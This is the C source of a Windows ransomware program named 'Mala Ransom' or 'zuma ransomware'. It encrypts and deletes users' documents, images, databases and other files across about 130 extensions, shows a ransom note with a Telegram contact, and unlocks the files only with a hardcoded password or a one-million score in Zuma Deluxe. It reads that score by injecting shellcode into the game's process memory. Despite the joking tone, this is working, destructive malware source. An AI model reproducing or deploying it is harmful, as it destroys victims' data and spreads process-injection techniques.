#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "process.h"
#include "data.h"
#include "crypto/crypto.h"
#include "crypto/encoding.h"
#include "util/fs.h"
#include <commctrl.h>
#include <shellapi.h>
#include <stdbool.h>

LPWSTR* g_foundFiles = NULL;
SIZE_T g_foundFilesCount = 0;

#define ENC_KEY_SIZE 128
CHAR g_encKey[ENC_KEY_SIZE];

LPWSTR  g_directory         = L"C:\\";
LPCWSTR g_targetExtsEnc     = L"..doc;.docx;.xls;.xlsx;.xlsm;.ppt;.pptx;.pdf;.txt;.rtf;.odt;.ods;.odp;.csv;.wps;.md;.tex;.jpg;.jpeg;.png;.bmp;.gif;.tiff;.webp;.raw;.cr2;.nef;.arw;.dng;.psd;.kra;.clip;.ai;.eps;.svg;.xcf;.cdr;.indd;.mp3;.wav;.flac;.aac;.ogg;.m4a;.mp4;.avi;.mov;.mkv;.wmv;.flv;.zip;.rar;.7z;.tar;.gz;.bz2;.xz;.iso;.bak;.backup;.old;.sql;.db;.sqlite;.sqlite3;.mdb;.accdb;.mdf;.ldf;.frm;.myd;.myi;.xml;.json;.yaml;.yml;.ini;.cfg;.conf;.html;.css;.js;.ts;.php;.py;.java;.c;.cpp;.h;.cs;.go;.rs;.swift;.kt;.vb;.sln;.vcxproj;.project;.dwg;.dxf;.cad;.step;.stl;.blend;.fbx;.obj;.3ds;.max;.unity;.uasset;.umap;.vsd;.vsdx;.vmdk;.vdi;.vmx;.qcow2;.ova;.ovf;.pst;.ost;.eml;.msg";
LPCWSTR g_targetExtsDec     = L".idontwannaseemorebloodshed";
                       
HWND link;

BOOL FetchFilesUser() {
    g_foundFiles = NULL;
    g_foundFilesCount = 0;
    LPWSTR directory = NULL;
    if (!FS_GetCurrentUserPath(&directory)) {
        return FALSE;
    }

    g_directory = directory;

    const BOOL skipProtected = TRUE;
    return FS_QueryFilesWithExt(
        g_directory, g_targetExtsEnc, skipProtected,
        &g_foundFiles, &g_foundFilesCount
    );
}

BOOL FetchFiles() {
    g_foundFiles = NULL;
    g_foundFilesCount = 0;
    const BOOL skipProtected = TRUE;
    return FS_QueryFilesWithExt(
        g_directory, g_targetExtsEnc, skipProtected,
        &g_foundFiles, &g_foundFilesCount
    );
}

BOOL EncryptFiles() {
    BYTE key[AES_KEY_SIZE] = {
        255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255
    };

    BYTE iv[AES_BLOCK_SIZE] = {
        0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,0
    };

    if (!EC_DeriveBase64Key(g_encKey, ENC_KEY_SIZE, key, AES_KEY_SIZE, iv, AES_BLOCK_SIZE)) {
        return FALSE;
    }

    for (SIZE_T i = 0; i < g_foundFilesCount; i++) {
        WCHAR outFile[MAX_PATH] = { 0 };
        wcsncpy_s(outFile, MAX_PATH, g_foundFiles[i], _TRUNCATE);
        wcsncat_s(outFile, MAX_PATH, g_targetExtsDec, _TRUNCATE);

        CryptoError encRes = CT_EncryptFile(g_foundFiles[i], outFile, 
            key, AES_KEY_SIZE, iv, AES_BLOCK_SIZE);
        if (encRes == CT_OK) {

        }
        else continue;

        DeleteFileW(g_foundFiles[i]);
    }
    g_foundFiles = NULL;
    g_foundFilesCount = 0;
    FetchFiles();

    if (!FS_QueryFilesWithExt(
        g_directory, g_targetExtsDec, TRUE,
        &g_foundFiles, &g_foundFilesCount
    )) {
        return FALSE;
    }
    for (SIZE_T i = 0; i < g_foundFilesCount; i++) {
        WCHAR outFile[MAX_PATH] = { 0 };
        wcsncpy_s(outFile, MAX_PATH, g_foundFiles[i], _TRUNCATE);
        wcsncat_s(outFile, MAX_PATH, g_targetExtsDec, _TRUNCATE);

        CryptoError encRes = CT_EncryptFile(g_foundFiles[i], outFile, 
            key, AES_KEY_SIZE, iv, AES_BLOCK_SIZE);
        if (encRes == CT_OK) {

        }
        else continue;

        DeleteFileW(g_foundFiles[i]);
    }

    return TRUE;
}

BOOL DecryptFiles() {
    LPWSTR* foundFiles = NULL;
    SIZE_T foundFilesCount = 0;

    const BOOL skipProtected = TRUE;

    if (!FS_QueryFilesWithExt(
        g_directory, g_targetExtsDec, skipProtected,
        &foundFiles, &foundFilesCount
    )) {
        return FALSE;
    }

    BYTE key[AES_KEY_SIZE] = {
        255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255
    };
    
    BYTE iv[AES_BLOCK_SIZE] = {
        0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,0
    };

    SIZE_T keyLen = AES_KEY_SIZE;
    SIZE_T ivLen = AES_BLOCK_SIZE;

    if (!EC_UnpackBase64Key(g_encKey, key, &keyLen, iv, &ivLen)) {
        return FALSE;
    }

    if (keyLen != AES_KEY_SIZE || ivLen != AES_BLOCK_SIZE) {
        return FALSE;
    }

    for (SIZE_T i = 0; i < foundFilesCount; i++) {
        WCHAR outFile[MAX_PATH] = { 0 };
        wcsncpy_s(outFile, MAX_PATH, foundFiles[i], lstrlenW(foundFiles[i]) - lstrlenW(g_targetExtsDec));

        CryptoError decRes = CT_DecryptFile(foundFiles[i], outFile,
            key, AES_KEY_SIZE, iv, AES_BLOCK_SIZE);
        if (decRes == CT_OK) {
            DeleteFileW(foundFiles[i]);
        }
        else continue;
    }
    foundFiles = NULL;
    foundFilesCount = 0;
    FetchFiles();

    if (!FS_QueryFilesWithExt(
        g_directory, g_targetExtsDec, skipProtected,
        &foundFiles, &foundFilesCount
    )) {
        return FALSE;
    }

    for (SIZE_T i = 0; i < foundFilesCount; i++) {
        WCHAR outFile[MAX_PATH] = { 0 };
        wcsncpy_s(outFile, MAX_PATH, foundFiles[i], lstrlenW(foundFiles[i]) - lstrlenW(g_targetExtsDec));

        CryptoError decRes = CT_DecryptFile(foundFiles[i], outFile,
            key, AES_KEY_SIZE, iv, AES_BLOCK_SIZE);
        if (decRes == CT_OK) {
            DeleteFileW(foundFiles[i]);
        }
        else continue;
    }

    return TRUE;
}

DWORD lastedival;

DWORD GetScore()
{
    ReadProcessMemory(
            prochandle,
            edi,
            &edival,
            sizeof(edival),
            NULL);

    if (lastedival != edival)
    {
        InvalidateRect(mainwin, NULL, FALSE);
        UpdateWindow(mainwin);
        lastedival = edival;
    }

    return edival;
}

DWORD WINAPI Thread(LPVOID lpParam)
{
    while (TRUE)
    {
        if (GetScore() >= 1000000)
        {
            DecryptFiles();
            MessageBoxW(mainwin,L"Your files have been successfully decrypted enjoy!",L":)",MB_OK | MB_ICONINFORMATION);
            exit(0);
        }
        Sleep(10);
    }
    return 0;
}

DWORD lastpid;

int hookme()
{
    DWORD pid = GetProcId("popcapgame1.exe");

    if (lastpid != pid)
    {
        hooked = FALSE;
        lastpid = pid;
    }

    zumahandle = FindWindowA(0,"Zuma Deluxe 1.0");

    if (zumahandle == NULL)
    {
        MessageBoxW(mainwin,L"Zuma Deluxe 1.0 was not found",L"",MB_OK | MB_ICONERROR);
        return 2;
    }

    if (hooked)
    {
        MessageBoxW(mainwin,L"you are already hooked",L"",MB_OK | MB_ICONINFORMATION);
        return 2;
    }

    if (!pid) {
        return 1;
    }

    prochandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (!prochandle) {
        return 1;
    }

    MODULEENTRY32 me;
    me.dwSize = sizeof(me);

    HANDLE snap = CreateToolhelp32Snapshot(
        TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
        pid
    );

    if (!Module32First(snap, &me)) {
        CloseHandle(snap);
        return 1;
    }

    uintptr_t base = (uintptr_t)me.modBaseAddr;
    CloseHandle(snap);

    uintptr_t addr = base + 0xDF6EF;

    LPVOID cave = VirtualAllocEx(
        prochandle,
        NULL,
        0x2048,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    edi = VirtualAllocEx(
        prochandle,
        NULL,
        4,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    BYTE shellcode[64];
    int i = 0;

    BYTE instr1[] = { 0x89,0xBE,0xE8,0x00,0x00,0x00 };
    memcpy(shellcode + i, instr1, sizeof(instr1));
    i += sizeof(instr1);

    shellcode[i++] = 0x89;
    shellcode[i++] = 0x3D;
    *(DWORD*)(shellcode + i) = (DWORD)edi;
    i += 4;

    shellcode[i++] = 0xE9;

    DWORD returnaddr = (DWORD)(addr + 6); 
    DWORD relback = returnaddr - ((DWORD)cave + i + 4);
    *(DWORD*)(shellcode + i) = relback;
    i += 4;

    WriteProcessMemory(prochandle, cave, shellcode, i, NULL);

    BYTE jmp[6];

    jmp[0] = 0xE9;
    DWORD rel = (DWORD)cave - ((DWORD)addr + 5);
    *(DWORD*)(jmp + 1) = rel;
    jmp[5] = 0x90;

    WriteProcessMemory(prochandle, (LPVOID)addr, jmp, 6, NULL);

    CreateThread(NULL, 0, Thread, 0, 0, NULL);

    ShowWindow(zumaoverlayhandle,SW_SHOW);
    UpdateWindow(zumaoverlayhandle);

    hooked = TRUE;
    InvalidateRect(mainwin, NULL, FALSE);
    UpdateWindow(mainwin);
    
    return 0;
}

HDC hdcStatic;

LRESULT CALLBACK WndProc(
    HWND hwnd,
    UINT msg,
    WPARAM wParam,
    LPARAM lParam)
{
    switch (msg)
    {
        case WM_COMMAND:
            switch (LOWORD(wParam))
            {
                case 1: //hook
                    if (hookme() == 1)
                    {
                        MessageBoxW(mainwin,L"hook has failed are you sure popcapgame1.exe is running?",L"",MB_OK | MB_ICONERROR);
                    }else {
                        
                    }
                    break;
                case 2: //decrypt
                    if (GetDlgItemTextA(mainwin, 3, input, 256) == 0)
                    {
                        MessageBoxW(mainwin,L"an empty box is still empty even though its a box.",L"",MB_OK | MB_ICONERROR);
                    }else
                    {
                        if (strcmp(input,"thisisthepasswordyeahyouwouldnthavebelievedmeifihavetoldyou") == 0)
                        {
                            DecryptFiles();
                            MessageBoxW(mainwin,L"Your files have been successfully decrypted enjoy!",L":)",MB_OK | MB_ICONINFORMATION);
                            exit(0);
                        }else 
                        {
                            MessageBoxW(mainwin,L"Wrong password",L"",MB_OK | MB_ICONERROR);
                        }
                    }
                    break;
                
                default:
                    break;
            }
            break;
        case WM_CLOSE:
            return 0;
        case WM_CREATE:
            bgbitmap = (HBITMAP)LoadImage(
                instance,
                MAKEINTRESOURCE(101),
                IMAGE_BITMAP,
                0,
                0,
                LR_DEFAULTSIZE
            );
            break;
        case WM_PAINT:
            PAINTSTRUCT ps;
            HDC hdc;
            BITMAP bitmap;
            HDC hdcMem;
            HGDIOBJ oldBitmap;

            hdc = BeginPaint(hwnd, &ps);

            hdcMem = CreateCompatibleDC(hdc);
            oldBitmap = SelectObject(hdcMem, bgbitmap);

            GetObject(bgbitmap, sizeof(bitmap), &bitmap);

            BitBlt(
                hdc,
                ps.rcPaint.left,
                ps.rcPaint.top,
                ps.rcPaint.right  - ps.rcPaint.left,
                ps.rcPaint.bottom - ps.rcPaint.top,
                hdcMem,
                ps.rcPaint.left,
                ps.rcPaint.top,
                SRCCOPY
            );

            RECT rect  = {0, 10, 600, 30};
            RECT rect1 = {0, 30, 600, 50};
            RECT rect2 = {0, 50, 600, 70};
            RECT rect3 = {0, 70, 600, 90};
            RECT rect4 = {0, 90, 800,110};
            RECT rect5 = {0, 110, 800,130};
            RECT rect6 = {0, 130, 800,150};
            RECT rect7 = {0, 200, 600,220};
            RECT rect8 = {0, 220, 600,240};

            DrawTextA(hdc, "All your files have been encrypted!", -1, &rect, DT_LEFT | DT_TOP);
            DrawTextA(hdc, "But its okay Do not fear this is Mala Ransom (aka zuma ransomware) you dont have to pay us", -1, &rect1, DT_LEFT | DT_TOP);
            DrawTextA(hdc, "You can get your files back via the following methods", -1, &rect2, DT_LEFT | DT_TOP);
            DrawTextA(hdc, "get 1 million points on zuma deluxe and your files will be decrypted automatically", -1, &rect3, DT_LEFT | DT_TOP);
            DrawTextA(hdc, "or write me an essay on why minecraft streamer simulator is the best game ever on t.me/sh3dddd", -1, &rect4, DT_LEFT | DT_TOP);
            DrawTextA(hdc, "note if decryption fails and you successfully manage to complete one of these conditions", -1, &rect5, DT_LEFT | DT_TOP);
            DrawTextA(hdc, "contact me on before mentioned telegram for support", -1, &rect6, DT_LEFT | DT_TOP);

            if (hooked)
            {
                DrawTextA(hdc, "hook status : true", -1, &rect7, DT_LEFT | DT_TOP);
            }else
            {
                DrawTextA(hdc, "hook status : false", -1, &rect7, DT_LEFT | DT_TOP);
            }

            sprintf_s(score, sizeof(score), "score : %d", edival);
            DrawTextA(hdc, score, -1, &rect8, DT_LEFT | DT_TOP);

            SelectObject(hdcMem, oldBitmap);
            DeleteDC(hdcMem);

            EndPaint(hwnd, &ps);   
            break;
        case WM_DESTROY:
            DeleteObject(bgbitmap);
            PostQuitMessage(0);
            return 0;
        case WM_CTLCOLORDLG:
            hdcStatic = (HDC)wParam; 
			SetTextColor(hdcStatic, RGB(0,0,0));  
			SetBkMode(hdcStatic, TRANSPARENT);

			return (LRESULT)GetStockObject(NULL_BRUSH);
        case WM_CTLCOLORSTATIC:
            hdcStatic = (HDC)wParam; 
			SetTextColor(hdcStatic, RGB(0,0,0));  
			SetBkMode (hdcStatic, TRANSPARENT);

			return (LRESULT)GetStockObject(NULL_BRUSH);
        case WM_NOTIFY:
           switch(((NMHDR *)lParam)->code)
           {
               case NM_CLICK:
               {
                   NMLINK* pNMLink = (NMLINK*)lParam;
                   LITEM iItem = pNMLink->item;

                   if(wParam == 4)
                   {
                       ShellExecuteW(NULL,L"open",L"https://archive.org/details/zuma-deluxe",NULL,NULL, SW_SHOWNORMAL);
                   }
                }
            }
    }

    return DefWindowProc(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow)
{
    instance = hInstance;

    ShowWindow(GetConsoleWindow(),SW_HIDE);

    FetchFilesUser();
    EncryptFiles();

    INITCOMMONCONTROLSEX icc = {0};
    icc.dwSize = sizeof(icc);
    icc.dwICC = ICC_LINK_CLASS;
    InitCommonControlsEx(&icc);

    WNDCLASSEXA mainwindow = {0};
    mainwindow.cbSize = sizeof(WNDCLASSEX);
    mainwindow.hInstance = hInstance;
    mainwindow.lpfnWndProc = WndProc;
    mainwindow.hCursor = LoadCursor(NULL, IDC_ARROW);
    mainwindow.style = CS_DROPSHADOW;
    mainwindow.lpszClassName = "mainwindow";
    mainwindow.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);

    RegisterClassEx(&mainwindow);

    mainwin = CreateWindowExA(
        WS_EX_APPWINDOW | WS_EX_TOPMOST | WS_EX_COMPOSITED,
        "mainwindow",
        "",
        WS_BORDER | WS_CAPTION | WS_CLIPCHILDREN,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        800,
        800,
        NULL,
        NULL,
        instance,
        NULL
    );

    CreateWindowA(
        "BUTTON",
        "Hook",
        WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
        120, 700,
        120, 40,
        mainwin,
        (HMENU)1,
        instance,
        NULL
    );

    CreateWindowA(
        "BUTTON",
        "Decrypt",
        WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
        800-240, 700,
        120, 40,
        mainwin,
        (HMENU)2,
        instance,
        NULL
    );

    HWND edit = CreateWindowA(
        "EDIT",
        "",
        WS_VISIBLE | WS_CHILD | ES_AUTOHSCROLL | WS_BORDER,
        250, 710,
        300, 20,
        mainwin,
        (HMENU)3,
        instance,
        NULL
    ); 

    link = CreateWindowExW(
        0,
        WC_LINK,
        L"<a style=\"background-color: transparent;\" href=\"https://archive.org/details/zuma-deluxe\">Download Zuma</a>",
        WS_VISIBLE | WS_CHILD,
        250, 650, 110, 20,
        mainwin,
        (HMENU)4,
        instance,
        NULL
    );

    ShowWindow(mainwin,SW_SHOW);
    UpdateWindow(mainwin);

    RedrawWindow(mainwin, NULL, NULL,
    RDW_INVALIDATE | RDW_ALLCHILDREN);

    SetFocus(edit);

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        if (!IsWindowVisible(zumahandle) || IsIconic(zumahandle))
        {
            ShowWindow(zumaoverlayhandle, SW_HIDE);
            continue;
        }
        else
        {
            ShowWindow(zumaoverlayhandle, SW_SHOWNA);
        }

        RECT rect;
        if (GetWindowRect(zumahandle, &rect))
        {
            int w = rect.right - rect.left;
            int h = rect.bottom - rect.top;
        
            MoveWindow(
                zumaoverlayhandle,
                rect.left,
                rect.top,
                w,
                h,
                TRUE
            );
        
            SetWindowPos(
                zumaoverlayhandle,
                HWND_TOPMOST,
                0,0,0,0,
                SWP_NOMOVE |
                SWP_NOSIZE |
                SWP_NOACTIVATE);
        }
    }

    CloseHandle(prochandle);

    return msg.wParam;
}